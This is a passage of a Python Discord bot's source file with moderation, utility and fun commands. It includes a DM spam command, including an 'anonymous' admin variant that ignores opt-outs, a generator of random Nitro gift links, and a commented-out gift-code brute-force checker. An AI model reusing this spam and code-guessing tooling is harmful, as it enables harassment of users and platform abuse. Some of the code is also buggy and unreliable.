    elif user.id in optoutlist:
        await ctx.channel.send(f"Sorry, that user (`{user}`) has opted out of the `dmspam` command.")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        dmchannel = await user.create_dm()
        
        await ctx.message.delete()
        msg1 = await ctx.channel.send(f"Task started by `{ctx.author}`...")
        
        for i in range(number_of_times):
            try:
                await dmchannel.send(message)
            except Exception:
                await ctx.author.create_dm().send(
                    f"""Your `dmspam` task failed because the target (`{user}`) DMs are closed.""")
                await msg1.delete()
                return -1
        
        await msg1.delete()
        
        number_of_times2 = str(number_of_times)
        
        await dmchannel.send(f"Sent by `{ctx.author}`")
        
        msg2 = f"""<@{ctx.author.id}>, task done!

Message: {message}
Number of times: `{number_of_times2}`
User: `{user}`
Guild: `{ctx.guild.name}`"""
        
        await ctx.author.create_dm().send(msg2)


@bot.command(aliases=['dmsend_force', 'dmforcespam', 'dmforcesend', 'dmanonymous', 'dm_anonymous', 'send_anonymous'])
async def dmspam_force(ctx, number_of_times: int, user: discord.Member, *, message):
    if ctx.author.id != ownerid and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg who are you trying to spam?! noob hacker lmao, go hack ur mom instead")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        
        dmchannel = await user.create_dm()
        
        await ctx.message.delete()
        
        for i in range(number_of_times):
            try:
                await dmchannel.send(message)
            except Exception:
                await ctx.author.create_dm().send(
                    f"""Your `dmspam` task failed because the target (`{user}`) DMs are closed.""")
                return -1
        
        number_of_times2 = str(number_of_times)
        
        msg2 = f"""<@{ctx.author.id}>, task done!

Message: {message}
Number of times: `{number_of_times2}`
User: `{user}`
Guild: `{ctx.guild.name}`"""
        
        userdm = await ctx.author.create_dm()
        await userdm.send(msg2)


@bot.command(aliases=['optoutspam'])
async def optout_spam(ctx):
    optoutlist = replitRead("optoutlist")
    
    if ctx.author.id in optoutlist:
        await ctx.channel.send(
            "You are already in the opt-out list! If you wish to opt in again, use the command `.optin_spam`!")
    else:
        optoutlist.append(ctx.author.id)
        replitWrite("optoutlist", optoutlist)
        
        await ctx.channel.send(
            "You have opted out for spam! If you wish to opt in again, use the command `.optin_spam`!")


@bot.command(aliases=['optinspam'])
async def optin_spam(ctx):
    optoutlist = replitRead("optoutlist")
    
    if str(ctx.author.id) not in optoutlist:
        await ctx.channel.send(
            "You are already opted in for spam! If you wish to opt out, use the command `.optout_spam`!")
    else:
        optoutlist.remove(ctx.author.id)
        replitWrite("optoutlist", optoutlist)
        await ctx.channel.send(
            "You have opted in for spam! If you wish to opt out again, use the command `.optout_spam`!")


@bot.command()
async def lockall(ctx):
    if ctx.author.id != ownerid and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg why are you trying to lock channels!")
    else:
        for channel in ctx.guild.text_channels:
            if channel.overwrites_for(ctx.guild.default_role).send_messages:
                await channel.set_permissions(ctx.guild.default_role, send_messages=False,
                                              reason=f'User {ctx.author} used command lockall')
        
        await ctx.send(f"{ctx.author.mention}, Locked all channels successfully!")


@bot.command()
async def slowmode(ctx, duration: str):
    if not ctx.author.guild_permissions.manage_messages and ctx.author.id != ownerid:
        await ctx.channel.send('You are missing `Manage Messages` permissions!')
        return
    else:
        seconds = mzutils.parseTime(duration)
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.channel.send(f"Set the slowmode for channel: `#{ctx.channel}` to `{seconds}` seconds!")


@bot.command(aliases=['role'])
@commands.has_permissions(manage_roles=True)  # This must be exactly the name of the appropriate role
async def addrole(ctx, member: discord.Member, *, rolename):
    role = discord.utils.get(ctx.guild.roles, name=rolename)
    
    if role is None:
        await ctx.send("Could not find that role!")
        return
    
    if not ctx.author.top_role > role:
        await ctx.send("You do not have permission to do that! Failed to add role.")
        return
    
    if ctx.guild.get_member(bot.user.id).top_role < role:
        await ctx.send("The specified role is above my top role! Failed to add role.")
    
    if str(member) == "all":
        await ctx.send(f"Adding role to {len(ctx.guild.members)} members...")
        
        for i in ctx.guild.members:
            try:
                await i.add_roles(role)
            except AttributeError:
                await ctx.channel.send("An error occurred while trying to add role! Check whether that role exists!")
                errorrole = 1
                break
        await ctx.send(
            f"{ctx.author.mention}, Added role '{rolename}' to {len(ctx.guild.members)} members successfully!")
    
    else:
        errorrole = 0
        try:
            await member.add_roles(role)
        except AttributeError:
            await ctx.channel.send("An error occurred while trying to add role! Check whether that role exists!")
            errorrole = 1
        
        if errorrole == 0:
            await ctx.channel.send(f"Added role: `{rolename}` to `{member}` successfully!")


@bot.command()
async def setclaimschannel(ctx, channel):
    if channel is not None:
        try:
            channelid = removesuffix(
                removeprefix(channel, '<#')
                , '>')
        except Exception:
            try:
                channelid = int(channel)
            except Exception:
                await ctx.channel.send('An error occurred! Check your syntax!')
                return
    else:
        channelid = ctx.channel.id
    
    try:
        channeltest = client.get_channel(channelid)
    except Exception:
        await ctx.channel.send('Cannot find channel! Check your command!')
        return
    
    if not ctx.author.guild_permissions.administrator and ctx.author.id != ownerid:
        await ctx.channel.send("You don't have permissions to do that!")
        return
    else:
        claimsfile = open("claimschannel.txt", "r")
        serverid = ctx.message.guild.id
        claimslines = claimsfile.readlines()
        for line in claimslines:
            if str(serverid) in line:
                claimsfile.close()
                
                with open("claimschannel.txt", "r") as f:
                    lines = f.readlines()
                with open("claimschannel.txt", "w") as f:
                    for line1 in lines:
                        if line.strip("\n") != line:
                            f.write(line1)
                
                f.close()
                claimsfile = open('claimschannel.txt', 'a')
                claimsfile.write('\n')
                claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
                claimsfile.close()
                
                await ctx.channel.send(f"Successfully updated claims channel to <#{channelid}>!")
                return
        
        claimsfile.close()
        claimsfile = open('claimschannel.txt', 'a')
        claimsfile.write('\n')
        claimsfile.write(f"{str(serverid)}:{str(channelid)}")
        
        await ctx.channel.send(f"Successfully updated claims channel to <#{channelid}>!")
        
        claimsfile.close()


@bot.command(aliases=['claim'])
async def claimed(ctx, member: discord.Member, how, *, prize):
    if not ctx.author.guild_permissions.administrator and ctx.author.id != ownerid:
        await ctx.channel.send("You don't have permissions to do that")
    else:
        claimsfile2 = open('claimschannel.txt', 'r')
        claimlines = claimsfile2.readlines()
        server_id = ctx.message.guild.id
        foundserver = False
        
        for i in claimlines:
            if str(server_id) in i:
                i = removeprefix(i, f"{server_id}:")
                claimschannel = int(i)
                foundserver = True
                break
        if not foundserver:
            await ctx.channel.send("Cannot find claims channel! Try using '.setclaimschannel'!")
            return
        else:
            channel = bot.get_channel(int(claimschannel))
            await channel.send(f"""🎉 **Congratulations!** 🎉
{member.mention} claimed **{prize}** from **{how}**!""")
            await ctx.message.delete()
        claimsfile2.close()


@bot.command(aliases=['setproofchannel'])
async def setproofschannel(ctx, channelid):
    if channelid is not None:
        try:
            channelid = removesuffix(
                removeprefix(channelid, '<#')
                , '>')
        except Exception:
            try:
                channelid = int(channelid)
            except Exception:
                await ctx.channel.send('An error occurred! Check your syntax!')
                return
    else:
        channelid = ctx.channel.id
    
    channelid = int(channelid)
    
    try:
        channeltest = client.get_channel(channelid)
    except Exception:
        await ctx.channel.send('Cannot find channel! Check your command!')
        return
    
    if not ctx.author.guild_permissions.administrator and ctx.author.id != ownerid:
        await ctx.channel.send("Omg look at who's fiddling with server settings?!")
        return
    else:
        claimsfile = open("proofchannel.txt", "r")
        serverid = ctx.message.guild.id
        claimslines = claimsfile.readlines()
        for line in claimslines:
            if str(serverid) in line:
                claimsfile.close()
                
                with open("proofchannel.txt", "r") as f:
                    lines = f.readlines()
                with open("proofchannel.txt", "w") as f:
                    for line1 in lines:
                        if line.strip("\n") != line:
                            f.write(line1)
                
                f.close()
                claimsfile = open('proofchannel.txt', 'a')
                claimsfile.write('\n')
                claimsfile.write(f"{str(serverid)}:{str(channelid)}")
                
                claimsfile.close()
                
                await ctx.channel.send(f"Successfully updated proofs channel to <#{channelid}>!")
                return
        
        claimsfile.close()
        claimsfile = open('proofchannel.txt', 'a')
        claimsfile.write('\n')
        claimsfile.write(f"{str(serverid)}:{str(channelid)}")
        
        await ctx.channel.send(f"Successfully updated proofs channel to <#{channelid}>!")
        
        claimsfile.close()


@bot.command(aliases=['renamechannel'])
@commands.has_permissions(manage_channels=True)
async def rename(ctx, channel='', *, name):
    channel2 = None
    
    if channel != '':
        try:
            channelid = removesuffix(
                removeprefix(channel, '<#')
                , '>')
            channelid = int(channelid)
        except Exception:
            try:
                channelid = int(channel)
            except Exception:
                await ctx.channel.send('An error occurred! Check your syntax!')
                return
    else:
        channelid = ctx.channel.id
    
    try:
        channel2 = bot.get_channel(channelid)
    except Exception:
        await ctx.channel.send('Cannot find channel! Check your command!')
        return
    
    await channel2.edit(name=name)
    msg1 = await ctx.reply(f"Renamed #{channel2} to #{name}")
    await asyncio.sleep(5)
    await msg1.delete()
    await ctx.message.delete()


@commands.cooldown(1, 2, commands.BucketType.channel)
@bot.command()
async def purge(ctx, amount: int):
    if not (ctx.author.guild_permissions.manage_messages
            or ctx.author.id == ownerid):
        return
    
    if not amount < 100:
        quo = int(amount / 99)
        rem = amount - quo * 99
        
        channel = ctx.message.channel
        messages = []
        amount2 = amount
        amount3 = -1
        
        for i in range(quo):
            async for message in channel.history(limit=100):
                if not message.pinned and (datetime.datetime.utcnow().replace(
                        tzinfo=pytz.utc) - message.created_at).total_seconds() < 1209600:
                    messages.append(message)
                    amount3 += 1
                else:
                    amount2 = amount - 1
            await channel.delete_messages(messages)
            messages = []
        
        async for message in channel.history(limit=rem + 1):
            if not message.pinned:
                messages.append(message)
                amount3 += 1
            else:
                amount2 = amount - 1
        await channel.delete_messages(messages)
        messages = []
        
        msg2 = await ctx.send(f'{amount3} messages have been purged by {ctx.message.author.mention}.')
        await asyncio.sleep(3)
        
        await msg2.delete()
    
    else:
        
        channel = ctx.message.channel
        messages = []
        amount2 = amount
        amount3 = -1
        
        async for message in channel.history(limit=amount + 1):
            if not message.pinned:
                messages.append(message)
                amount3 += 1
            else:
                amount2 = amount - 1
        
        await channel.delete_messages(messages)
        msg2 = await ctx.send(f'{amount3} messages have been purged by {ctx.message.author.mention}.')
        await asyncio.sleep(3)
        
        await msg2.delete()


@commands.cooldown(1, 3, commands.BucketType.user)
@bot.command(aliases=['setafk'])
async def afk(ctx, *, reason='AFK'):
    afkdict = replitRead("afk")
    afkdict[str(ctx.author.id)] = [reason, str(int(datetime.datetime.utcnow().timestamp()))]
    await ctx.message.delete()
    msg1 = await ctx.send(f"{ctx.author.mention}, I set your AFK: {reason}")
    try:
        await ctx.author.edit(nick=f"[AFK] {ctx.author.display_name}")
    except Exception:
        pass
    
    replitWrite("afk", afkdict)


@bot.command(aliases=['cancelafk', 'afkremove'])
async def removeafk(ctx, *, member: discord.Member = None):
    afkdict = replitRead("afk")
    
    if member is None:
        member = ctx.author
    
    if member != ctx.author:
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("You do not have `Administrator` permissions.")
            return
    
    try:
        afkdict.pop(str(ctx.author.id))
    except Exception:
        pass
    
    if "[AFK] " in ctx.author.nick:
        try:
            await ctx.author.edit(nick=ctx.author.nick.replace("[AFK] ", ""))
            await ctx.send(f"AFK status removed for `{member}`\n"
                           f"Nickname updated.")
        except Exception:
            await ctx.send(f"AFK status removed for `{member}`\n"
                           f"I could not edit the user's nickname due to the role hierarchy.")
            return
    
    await ctx.send(f"AFK status removed for `{member}`")
    replitWrite("afk", afkdict)


@bot.command(aliases=['version', 'info'])
async def about(ctx):
    global uptime, launch_time
    
    tests = 20000  # the amount of tests to conduct
    latency_list = []  # this is where the tests go
    for x in range(tests):  # this is the loop
        latency = round(bot.latency * 1000)  # this gathers the latency
        latency_list.append(latency)  # puts the latency in the list
    lavg = round(sum(latency_list) / tests)  # averages the list out
    
    uptime = (datetime.datetime.utcnow() - launch_time).total_seconds()
    
    msg1 = await ctx.send("`Loading...`")
    
    uptime2 = mzutils.timestr(secs=uptime)
    
    sysinfl = mzutils.sysinf()
    
    msgmain = f"""
MZ Bot V2
Made by MuzhenGaming#5088
========================
Version info:
discord.py version {discord.__version__}
release {discord.version_info[3]}
Python version {sys.version}
release {sys.version_info[3]}
========================
Connection Info:
Ping {lavg} ms
(To get a more accurate ping use '.ping')
========================
Status Info:
Bot connected to: {len(bot.guilds)} servers
Bot uptime: {uptime2}
========================
{sysinfl[0]}
{sysinfl[1]}
{sysinfl[2]}"""
    
    embed = discord.Embed(title='**System Info**', description=msgmain, color=0x00ff00)
    
    await ctx.reply(embed=embed)
    await msg1.delete()


@bot.command(aliases=['ms', 'connection', 'internet', 'speedtest'])
async def ping(ctx, tests: int = 1000000):
    global downloadSpeed
    
    msg1 = await ctx.send("`Connecting...`")
    
    latency_list = []  # this is where the tests go
    for x in range(tests):  # this is the loop
        latency = round(bot.latency * 1000)  # this gathers the latency
        latency_list.append(latency)  # puts the latency in the list
    lavg = round(sum(latency_list) / tests)  # averages the list out
    
    id1 = ctx.message.id
    id2 = msg1.id
    
    time1 = discord.utils.snowflake_time(int(id1))
    time2 = discord.utils.snowflake_time(int(id2))
    ts_diff = time2 - time1
    secs = abs(ts_diff.total_seconds())
    
    if lavg < 25:
        jud1 = 'Fast'
    elif 25 <= lavg < 100:
        jud1 = 'Normal'
    else:
        jud1 = 'Slow - Bot Lagging!'
    
    if secs * 1000 < 150:
        jud2 = 'Fast'
    elif 150 <= secs * 1000 < 300:
        jud2 = 'Normal'
    else:
        jud2 = 'Slow - Bot Lagging!'
    
    msg1 = await ctx.reply(f"""**Internet Speedtest results**

Client Ping: `{lavg} ms` ({jud1})
Message Latency: `{int(secs * 1000)} ms` ({jud2})

Internet Speed: `Loading...`""")
    
    downloadSpeed = await speedTestDownload()
    uploadSpeed = await speedTestUpload()
    
    await msg1.edit(content=f"""**Internet Speedtest results**

Client Ping: `{lavg} ms` ({jud1})
Message Latency: `{int(secs * 1000)} ms` ({jud2})

Internet Speed: Download - `{downloadSpeed} Mbps`, Upload - `{uploadSpeed} Mbps`""")


@bot.command(aliases=['snowflake', 'timediff', 'difference'])
async def timedif(ctx, id1: int, id2: int = None):
    if ctx.message.reference is not None:
        id2 = ctx.message.reference.message_id
    elif id2 is None:
        id2 = ctx.message.id
    
    try:
        id1 = int(id1)
        id2 = int(id2)
    except Exception:
        await ctx.reply("Check your message IDs! They are incorrect!")
        return
    
    time1 = discord.utils.snowflake_time(int(id1))
    time2 = discord.utils.snowflake_time(int(id2))
    ts_diff = time2 - time1
    secs = abs(ts_diff.total_seconds())
    days, secs = divmod(secs, secs_per_day := 60 * 60 * 24)
    hrs, secs = divmod(secs, secs_per_hr := 60 * 60)
    mins, secs = divmod(secs, secs_per_min := 60)
    secs = round(secs, 2)
    answer = '{} secs'.format(secs)
    
    if mins > 0:
        answer = '{} mins and {} secs'.format(int(mins), secs)
    if hrs > 0:
        answer = '{} hrs, {} mins and {} secs'.format(int(hrs), int(mins), secs)
    if days > 0:
        answer = '{} days, {} hrs, {} mins and {} secs'.format(int(days), int(hrs), int(mins), secs)
    
    greater = 2
    # find earlier id
    if max((time1, time2)) == time1:
        greater = 1
    else:
        greater = 2
    
    embed = discord.Embed(title=f"**{answer}**", description=f"""**Time Difference**
**Message 1:** {id1}
Sent <t:{int(time1.timestamp())}:R>: <t:{int(time1.timestamp())}>
**Message 2:** {id2}
Sent <t:{int(time2.timestamp())}:R>: <t:{int(time2.timestamp())}>

Time difference between the 2 IDs:
**{answer}**""", color=0x00ff00)
    await ctx.reply(embed=embed)


@bot.command()
@commands.has_permissions(administrator=True)  # This must be exactly the name of the appropriate role
async def removerole(ctx, member: discord.Member, *, rolename):
    role = discord.utils.get(ctx.guild.roles, name=rolename)
    errorrole = 0
    
    try:
        await member.remove_roles(role)
    except AttributeError:
        await ctx.channel.send("An Error Occurred while trying to add role! Check whether that role exists!")
        errorrole = 1
    
    if errorrole == 0:
        await ctx.channel.send(f"Removed role: {rolename} from member {member} successfully!")


@commands.cooldown(1, 10, commands.BucketType.user)
@bot.command(aliases=['tickets'])
async def ticket(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title='**Ticket Tool [BETA]**',
        description='React with 📩 to make a ticket',
        color=0x00ff00
    )
    
    embed.set_footer(text="Ticket Tool Beta | MZ Bot")
    
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("📩")
    
    def check(treaction, user1):
        global user
        global reaction
        reaction = treaction
        user = user1
        return str(reaction) == '📩' and user.id != bot.user.id
    
    global user
    
    while True:
        await bot.wait_for("reaction_add", check=check)
        await msg.remove_reaction('📩', user)
        
        member = user
        
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            member: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        
        lines = replitRead("tickets")
        
        if str(user.id) in lines:
            errormsg = await ctx.send(f"{user.mention}, You already have a ticket open!")
            await asyncio.sleep(4)
            await errormsg.delete()
        else:
            channel = await guild.create_text_channel(f'ticket-{user}', overwrites=overwrites)
            embed = discord.Embed(title='**Welcome! Support will arrive shortly**',
                                  description="To delete this ticket, use '.delete'", color=0x00ff00)
            embed.set_footer(text="Ticket Tool Beta | MZ Bot")
            
            await channel.send(f'{user.mention}')
            await channel.send(embed=embed)
            
            lines += f"{user.id}\n"
            replitWrite("tickets", lines)


@commands.cooldown(1, 5, commands.BucketType.channel)
@bot.command(aliases=['tdelete', 'tclose', 'deletechannel'])
@commands.has_permissions(administrator=True)
async def delete(ctx):
    #     if isinstance(ctx.channel, discord.abc.PrivateChannel):
    channelperms = ctx.channel.overwrites_for(ctx.author)
    memberoverwrite = channelperms
    
    if memberoverwrite == discord.PermissionOverwrite(read_messages=True,
                                                      send_messages=True) \
            or ctx.author.guild_permissions.manage_channels:
        
        msg = await ctx.reply("""**Are you sure you wish to delete this channel permanently?**
This is an irreversible action.
React with 👍 to delete.""")
        await msg.add_reaction("👍")
        
        def check(reaction, user):
            return str(reaction) == "👍" and user.id != 877804981347029043
        
        await bot.wait_for("reaction_add", check=check)
        await ctx.send(f"{ctx.author.mention}, Channel will be deleted in **5 seconds**")
        async with ctx.channel.typing():
            await asyncio.sleep(5)
        await ctx.send("Deleting channel...")
        await ctx.channel.delete()
        
        lines: str = replitRead("tickets")
        lines.replace(f"{ctx.author.id}\n", "")
        replitWrite("tickets", lines)
    
    else:
        await ctx.reply("This is not your ticket!")
        return


#         await ctx.reply("Hey! This isn't a ticket!")

@bot.command(aliases=['definition', 'meaning', 'dictionary'])
async def define(ctx, *, word):
    dictionary = PyDictionary()
    meaning = """"""
    
    async with ctx.channel.typing():
        meaningDict = dictionary.meaning(word)
        
        try:
            for i in meaningDict.keys():
                meaning = meaning + f"**{i}**:\n"
                for j in meaningDict[i]:
                    meaning = meaning + f" - {j}\n"
            
            meaning = removesuffix(meaning, "\n")
        except Exception:
            await ctx.reply(f"`{word}` not found in dictionary!")
            return
        
        embed = discord.Embed(title=f'**Definition for `{word}`**', description=f"""Definition for `{word}`:
{meaning}""", color=0x00ff00)
        embed.set_footer(text="Powered by PyDictionary | Beta")
        
        await ctx.reply(embed=embed)


@bot.command(aliases=['massnitro', 'nitrospam'])
async def dmnitro(ctx, amount: int):
    # genlist = str(open('nitrogenlist.txt', 'r').read())
    # genlistsplit = genlist.split("\n")
    
    channel = await ctx.author.create_dm()
    
    for i in range(amount):
        # response = str(random.choice(genlistsplit))
        
        code = "".join(random.choices(
            string.ascii_uppercase + string.digits + string.ascii_lowercase,
            k=16
        ))
        
        response = f"https://discord.gift/{code}"
        
        await channel.send(response)
    
    await channel.send(f"{ctx.author.mention}, Successfully generated {amount} nitro codes in your DM!")


# @bot.command(name='checknitro', aliases=['genchecknitro', 'genpremium']
# async def genandcheck(ctx, amount):
# if ctx.author.id == 926410988738183189:
#     valid = []  # Keep track of valid codes
#     invalid = 0
#     code = "".join(random.choices(  # Generate the id for the gift
#         string.ascii_uppercase + string.digits + string.ascii_lowercase,
#         k=19
#     ))
#     url = f"https://discord.gift/{code}"  # Generate the url

#     result = self.quickChecker(url, webhook)  # Check the codes

#     url = input('')  # Get the awnser
#         webhook = url if url != "" else None  # If the url is empty make it be None insted

#     if result:  # If the code was valid
#         valid.append(url)  # Add that code to the list of found codes
#     else:  # If the code was not valid
#         invalid += 1  # Increase the invalid counter by one
#     channel = await ctx.author.create_dm()
#     await channel.send(f"""
# Results:
# Valid: {len(valid)}
# Invalid: {invalid}
# Valid Codes: {', '.join(valid)}""")

@bot.command(aliases=['mc', 'members'])
async def membercount(ctx):
    # count = ctx.guild.member_count
    botc = 0
    for i in range(2):
        botc = 0
        onlc = 0
        guild1 = bot.get_guild(ctx.guild.id)
        count = len(guild1.members)
        
        for m in guild1.members:
            if m.bot:
                botc += 1
            elif not str(m.raw_status) == "offline":
                onlc += 1
    
    embed = discord.Embed(title=f"**Member Count**", description=f"""**Member count for {guild1.name}:**

`{count}` members
`{botc}` bots
`{count - botc}` humans

`{onlc}` humans online
`{count - botc - onlc}` humans offline""", color=0x00ff00)
    
    await ctx.reply(embed=embed)


@bot.command(aliases=['sniper'])
async def snipe(ctx, pos: int = 1):
    snipes = replitRead("snipes")  # returns a dictionary.
    
    success1 = False
    success2 = False
    
    try:
        lst = snipes[(sorted(snipes.keys())[-pos])]
        if lst is not None:
            success1 = True
    except Exception:
        if pos == 1:
            await ctx.reply("No messages deleted yet.")
        else:
            await ctx.reply("There is no message found at that index.")
        return
    
    if success1:
        try:
            lst = lst.split("||2435baff2acdeef16e7f9e810e883ac572e5d04f||")
        except Exception:
            pass
        
        lst[0], lst[1], lst[3], lst[4] = int(lst[0]), int(lst[1]), int(lst[3]), int(lst[4])
        
        if not lst[1] == ctx.channel.id:
            success2 = False
            pos1 = pos - 1
            while True:
                try:
                    lst = snipes[sorted(snipes.keys())[-1 - pos1]]
                    lst = lst.split("||2435baff2acdeef16e7f9e810e883ac572e5d04f||")
                    lst[0], lst[1], lst[3], lst[4] = int(lst[0]), int(lst[1]), int(lst[3]), int(lst[4])
                    
                    if lst[1] == ctx.channel.id:
                        success2 = True
                        break
                
                except Exception:
                    break
                
                pos1 += 1
        else:
            success2 = True
        
        if not success2:
            await ctx.reply("No messages deleted yet.")
        
        else:
            embed = discord.Embed(title="**Sniper (BETA)**", description=f"""**Successfully sniped a message!**
Sent in {ctx.channel}
Sent by <@{lst[0]}>
Sent <t:{lst[3]}:R>
Deleted <t:{lst[4]}:R>

**Message content:**
{lst[2]}""")
            await ctx.reply(embed=embed)


@bot.command(aliases=['editsniper'])
async def esnipe(ctx, pos: int = 1):
    esnipes = replitRead("esnipes")
    
    success1 = False
    success2 = False
    
    try:
        lst = esnipes[(sorted(esnipes.keys())[-pos])]
        lst = lst.split("||9cd692681d3df8f3bb8aa91b903370d31b7fa662||")
        lst[0], lst[1], lst[4], lst[5] = int(lst[0]), int(lst[1]), int(lst[4]), int(lst[5])
        
        if lst is not None:
            success1 = True
    except Exception:
        if pos == 1:
            await ctx.reply("No messages edited yet.")
        else:
            await ctx.reply("There is no message found at that index.")
        return
    
    if success1:
        try:
            lst = lst.split("||9cd692681d3df8f3bb8aa91b903370d31b7fa662||")
        except Exception:
            pass
        
        lst[0], lst[1], lst[4], lst[5] = int(lst[0]), int(lst[1]), int(lst[4]), int(lst[5])
        
        if not lst[1] == ctx.channel.id:
            success2 = False
            pos1 = pos - 1
            while True:
                try:
                    lst = esnipes[sorted(esnipes.keys())[-1 - pos1]]
                    lst = lst.split("||9cd692681d3df8f3bb8aa91b903370d31b7fa662||")
                    lst[0], lst[1], lst[4], lst[5] = int(lst[0]), int(lst[1]), int(lst[4]), int(lst[5])
                    
                    if lst[1] == ctx.channel.id:
                        success2 = True
                        break
                
                except Exception:
                    break
                
                pos1 += 1
        else:
            success2 = True
        
        if not success2:
            await ctx.reply("No messages edited yet.")
        
        else:
            embed = discord.Embed(title="**EditSniper (BETA)**", description=f"""**Successfully editsniped a message!**
Sent in {ctx.channel}
Sent by <@{lst[0]}>
Sent <t:{lst[4]}:R>
Edited <t:{lst[5]}:R>

**Original Message content:**
{lst[2]}

**New Message content:**
{lst[3]}""")
            await ctx.reply(embed=embed)


@bot.command()
async def invites(ctx, person=None):
    member = None
    
    if person is not None:
        try:
            personid = removesuffix(
                removeprefix(person, '<@')
                , '>')
            person = bot.get_user(int(personid))
        except Exception:
            await ctx.reply("I can't find that user.")
    
    if person is None:
        person = ctx.author
        member = person
    
    if person.id != ctx.author.id:
        try:
            personid = removesuffix(
                removeprefix(person, '<@')
                , '>')
            member = bot.get_user(int(personid))
        except Exception:
            try:
                member = bot.get_user(int(person))
            except Exception:
                await ctx.reply("I can't find that user.")
    
    totalInvites = 0
    for i in await ctx.guild.invites():
        if i.inviter == member:
            totalInvites += i.uses
    embed = discord.Embed(title=f'**Invites for {member}**', description=f'''You have **{totalInvites}** invites.
*Note: This is in testing and may not be the actual number of invites you have.*''')
    await ctx.reply(embed=embed)


@bot.command(aliases=['inviteuser', 'inviteu', 'sendinvite', 'sendinv'])
async def dminvite(ctx, user: discord.Member, *, reason=None):
    channelid = ctx.guild.text_channels[0].id
    
    channel = ctx.guild.text_channels[0]
    
    inviteurl = await channel.create_invite(unique=False, reason=f"{ctx.author} Used .dminvite")
    
    try:
        person = await bot.fetch_user(user.id)
        success1 = True
    except Exception:
        person = bot.get_user(user.id)
        if person is not None:
            success1 = True
    
    success2 = True
    
    if not success1:
        await ctx.reply("I can't find that user.")
    else:
        try:
            dms = await person.create_dm()
        
        except Exception:
            await ctx.reply("I cannot create a DM with that user.")
            success2 = False
        
        if success2:
            await dms.send(f"""Hi {person.mention},
{ctx.author.name} has invited you to join "{ctx.guild.name}".
Reason: {reason}
Invite link: {inviteurl}
*Please Note: MZ Bot is not responsible for any content in that server.*""")
            await ctx.reply("✅ Sent.")


@bot.command(aliases=['nsfwsettings'])
# work in progress. Currently, the discord.py API does not support changing NSFW settings.
async def setnsfw(ctx, status=None):
    if status is None:
        nsfwon = await ctx.channel.is_nsfw()
        status = not nsfwon
    if status.strip().lower() in ["true", "on", "enable", "enabled"]:
        status = True
    elif status.strip().lower() in ["false", "off", "disable", "disabled"]:
        status = False


@bot.command(aliases=['countdown'])
async def timer(ctx, duration, *, item=' '):
    if not (ctx.author.guild_permissions.administrator
            or ctx.author.id == ownerid):
        return
    
    if 's' in duration:
        duration2 = int(removesuffix(duration, 's'))
        duration3 = removesuffix(duration, 's') + ' seconds'
    elif 'm' in duration:
        duration2 = 60 * int(removesuffix(duration, 'm'))
        duration3 = removesuffix(duration, 'm') + ' minutes'
    elif 'h' in duration:
        duration2 = 3600 * int(removesuffix(duration, 'h'))
        duration3 = removesuffix(duration, 'h') + ' hours'
    elif 'd' in duration:
        duration2 = 3600 * 24 * int(removesuffix(duration, 'd'))
        duration3 = removesuffix(duration, 'd') + ' days'
    else:
        try:
            duration2 = int(duration)
        except Exception:
            duration2 = 0
            
            duration3 = 'undefined'
    
    stop = False
    timel = duration2
    timels = mzutils.timestr(duration2)
    iters = 0
    startt = datetime.datetime.utcnow()
    
    embed = discord.Embed(title=f"Countdown: **{item}**")
    endtt = (datetime.datetime.utcnow() + datetime.timedelta(seconds=duration2)).timestamp()
    
    embed.add_field(name="Time remaining:", value=f"**{timels}**")
    embed.add_field(name="Ends at:", value=f"<t:{round(endtt)}>")
    
    msg = await ctx.send(embed=embed)
    await ctx.message.delete()
    
    start = 0
    stopped = 0
    lasttt = 5
    
    while not stop:
        if timel < 5:
            await asyncio.sleep(timel + 5 - lasttt)
            stop = True
            timel = 0
            break
        
        # corr1 = datetime.datetime.utcnow() - datetime.timedelta(seconds=5) - startt
        #  corr2 = datetime.timedelta(seconds=5) - corr1
        # await asyncio.sleep(corr2.total_seconds())
        
        if start != 0:
            lasttt = stopped - start
        
        start = timeit.default_timer()
        
        await asyncio.sleep(10 - lasttt)
        
        timel = timel - (10 - lasttt)
        timels = mzutils.timestr(timel)
        
        embed_dict = embed.to_dict()
        
        for field in embed_dict["fields"]:
            if field["name"] == "Time remaining:":
                field["value"] = f"**{timels}**"
        
        newembed = discord.Embed.from_dict(embed_dict)
        
        await msg.edit(embed=newembed)
        stopped = timeit.default_timer()
    
    embed_dict = embed.to_dict()
    for field in embed_dict["fields"]:
        if field["name"] == "Time remaining:":
            field["value"] = f"**Ended** <t:{round(datetime.datetime.utcnow().timestamp())}:R>"
    
    newembed = discord.Embed.from_dict(embed_dict)
    
    await msg.edit(embed=newembed)
    
    await msg.channel.send(f"**The countdown for {item if item != ' ' else '(undefined)'} has ended!**")


@bot.command(aliases=['forcemute', 'fullmute', 'shutup'])
async def hardmute(ctx, person: discord.Member):
    hardmutes = replitRead("hardmutes")
    
    if not ctx.author.id == ownerid:
        await ctx.message.delete()
    else:
        if person.id in hardmutes:
            await ctx.message.delete()
        else:
            hardmutes.append(person.id)
            await ctx.message.delete()
    
    replitWrite("hardmutes", hardmutes)


@bot.command(aliases=['forceunmute', 'fullunmute'])
async def hardunmute(ctx, person: discord.Member):
    hardmutes = replitRead("hardmutes")
    
    if not ctx.author.id == ownerid:
        await ctx.message.delete()
    else:
        if person.id not in hardmutes:
            await ctx.message.delete()
        else:
            hardmutes.remove(person.id)
            await ctx.message.delete()
    
    replitWrite("hardmutes", hardmutes)


@bot.command(aliases=['memberinfo'])
async def whois(ctx, person: discord.Member):
    mname = str(person.name)
    mnick = person.display_name
    mperms = person.guild_permissions
    mroles = person.roles
    mdiscrim = person.discriminator
    joinedg = round(person.joined_at.timestamp())
    joinedd = round(person.created_at.timestamp())
    mstatus = str(person.status)
    mrolestr = '@everyone '
    mpermstr = ''
    mrnames = []
    for i in mroles:
        if i.name != "@everyone":
            mrnames.append(i.id)
    
